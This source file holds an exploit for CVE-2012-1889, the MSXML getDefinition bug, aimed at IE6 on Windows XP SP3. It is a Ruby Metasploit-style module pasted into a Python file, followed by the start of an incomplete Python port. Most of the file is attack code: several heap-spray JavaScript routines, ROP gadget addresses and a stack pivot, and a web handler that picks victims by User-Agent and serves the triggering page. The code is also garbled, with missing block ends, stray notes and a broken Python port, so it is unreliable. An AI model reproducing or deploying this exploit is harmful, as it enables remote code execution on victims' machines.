"""
CVE-2012-1889

'Payload'        =>
{
    'BadChars' => "\x00",
    'Space'    => 1024
},
User asgent from web logs:
NT 5.1 and agent MSIE 6    
# msxml3.dll 8.90.1101.0          
'IE 6 on Windows XP SP3'
    'Offset' => '0x100',
    'Rop' => nil,
    'RandomHeap' => false
 
  
    

    adjust << popret(t)
    adjust << [ t['StackPivot'] ].pack("V")
    adjust << ret(t) * 4 # first call to a "ret" because there is a good gadget in the stack :)

    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
      when :msvcrt
        print_status("Using msvcrt ROP")
        rop = generate_rop_payload('msvcrt','',{'target'=>'xp', 'pivot'=>adjust})

      else
        print_status("Using JRE ROP")
        rop = generate_rop_payload('java','',{'pivot'=>adjust})
    
    return rop

  def get_easy_spray(t, js_code, js_nops)

    spray = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;

    var offset = nops.substring(0, #{t['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);


    heap_obj.gc();
    for (var z=1; z < 0x230; z++) {
      heap_obj.alloc(block);
    }

    JS

    return spray

  
  def get_aligned_spray(t, js_rop, js_code, js_nops, js_90_nops)

    spray = '''
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");
    var nops_90 = unescape("#{js_90_nops}");
    var rop_chain = unescape("#{js_rop}");

    while (nops.length < 0x80000) nops += nops;
    while (nops_90.length < 0x80000) nops_90 += nops_90;

    var offset = nops.substring(0, #{t['Offset']});
    var nops_padding = nops.substring(0, #{t['RopChainOffset']}-code.length-offset.length);
    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);


    heap_obj.gc();
    for (var z=1; z < 0x230; z++) {
      heap_obj.alloc(block);
    }

    '''

    return spray

  

  # Spray published by corelanc0d3r
  # Exploit writing tutorial part 11 : Heap Spraying Demystified
  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
  def get_random_spray(t, js_rop, js_code, js_90_nops)

    spray = '''

    function randomblock(blocksize)
    {
      var theblock = "";
      for (var i = 0; i < blocksize; i++)
      {
        theblock += Math.floor(Math.random()*90)+10;
      }
      return theblock;
    }

    function tounescape(block)
    {
      var blocklen = block.length;
      var unescapestr = "";
      for (var i = 0; i < blocklen-1; i=i+4)
      {
        unescapestr += "%u" + block.substring(i,i+4);
      }
      return unescapestr;
    }

    var heap_obj = new heapLib.ie(0x10000);

    var rop = unescape("#{js_rop}");
    var code = unescape("#{js_code}");
    var nops_90 = unescape("#{js_90_nops}");

    while (nops_90.length < 0x80000) nops_90 += nops_90;

    var offset_length = #{t['RopChainOffset']};

    for (var i=0; i < 0x1000; i++) {
      var padding = unescape(tounescape(randomblock(0x1000)));
      while (padding.length < 0x1000) padding+= padding;
      var junk_offset = padding.substring(0, offset_length - code.length);
      var single_sprayblock = code + junk_offset + rop + nops_90.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
      heap_obj.alloc(sprayblock);
    }

    '''

    return spray
  

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have the same setup we're targeting
    if my_target.nil?
      print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    
    p = payload.encoded
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
    js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

    if not my_target['Rop'].nil?
      js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))
    end

    if my_target['RandomHeap']
      js = get_random_spray(my_target, js_rop, js_code, js_90_nops)
    elsif not my_target['Rop'].nil?
      js = get_aligned_spray(my_target, js_rop, js_code, js_nops, js_90_nops)
    else
      js = get_easy_spray(my_target, js_code, js_nops)
    end

    js = heaplib(js, {:noobfu => true})

    object_id = rand_text_alpha(4)

    html = '''
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="#{object_id}"></object>
    <script>
    var obj = document.getElementById('#{object_id}').object;
    var src = unescape("%u0c08%u0c0c");
    while (src.length < 0x1002) src += src;
    src = "\\\\\\\\xxx" + src;
    src = src.substr(0, 0x1000 - 10);
    var pic = document.createElement("img");
    pic.src = src;
    pic.nameProp;
    obj.definition(#{rand(999) + 1});
    </script>
    </body>
    </html>
    '''

    html = html.gsub(/^ {4}/, '')

    print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
    send_response(cli, html, {'Content-Type'=>'text/html'})

#removed a bein/end section that appears to be part

"""
#Python implementation of CVE-2012-1889 targeting WinXP SP3 IE6
#Author Disc0rdantM3l0dy
#Code based on exploit/windows/browser/msxml_get_definition_code_exec.rb
#Original Authorship Props To:
#inking26       # Reliable exploitation
#binjo          # Metasploit module
#sinn3r         # Metasploit module
#juan vazquez   # Metasploit module
#
#Usage CVE-2012-1889.py -i [IP for Webserver to Listen on] -p [Port for Webserver to Listen on]
 
import sys
import socket
import struct

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

def ret(t):
    #if t['Rop']
    case = {
        # RETN (ROP NOP) # msvcrt.dll
        'msvcrt': struct.pack('<I', 0x77c4ec01),
        # RETN (ROP NOP) # msvcr71.dll
        'jre': struct.pack('<I', 0x7c347f98)
    }
    return case.get()
        """
        when :msvcrt
        return [ 0x77c4ec01 ].pack("V") 
        
        when :jre
        return [ 0x7c347f98 ].pack("V") 
        """

  def popret(t)
    case t['Rop']
      when :msvcrt
        return [ 0x77c4ec00 ].pack("V") # POP EBP # RETN (ROP NOP) # msvcrt.dll
      when :jre
        return [ 0x7c376541 ].pack("V") # POP EBP # RETN (ROP NOP) # msvcr71.dll

def get_rop_chain(t)
    adjust = ret(t)